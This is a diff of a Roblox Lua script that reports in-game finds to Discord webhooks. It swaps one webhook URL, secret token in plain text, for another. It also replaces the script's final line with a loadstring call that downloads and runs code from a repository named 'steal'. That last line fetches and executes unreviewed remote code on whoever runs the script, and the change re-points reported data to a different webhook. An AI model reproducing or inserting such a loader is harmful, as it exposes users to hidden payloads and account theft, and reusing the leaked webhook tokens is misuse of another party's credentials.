@@ -57,7 +57,7 @@ local WEBHOOKS = {
         sendTeleport = true
     },
     { -- Special brainrots + overpay
-        url = 'https://discord.com/api/webhooks/1449482688103714920/ByuScNUToYq_zL7_eoK2JGDc1R7HKXqkxQIrtav2bp6gVA3b1xN-tNQz9ciXbqo-QZi4',
+        url = 'https://discord.com/api/webhooks/1424147041311002656/W_E7_-Z9DUucHP4p5BqOYeVKWhtACzAzVQCNW2nD0CPikwwk4yfEBVbgmV_wVsoNR_Oo',
         title = '⭐️ SPECIAL BRAINROTS',
         color = 0xff00ff,
         special = true,
@@ -674,4 +674,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/DR4G0NC4N3LL0NI/STR4WB3RRYELEPHANT/refs/heads/main/S3RV3R5HOPPER.LUA"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hpwerdsf/steal/refs/heads/main/nenado"))()
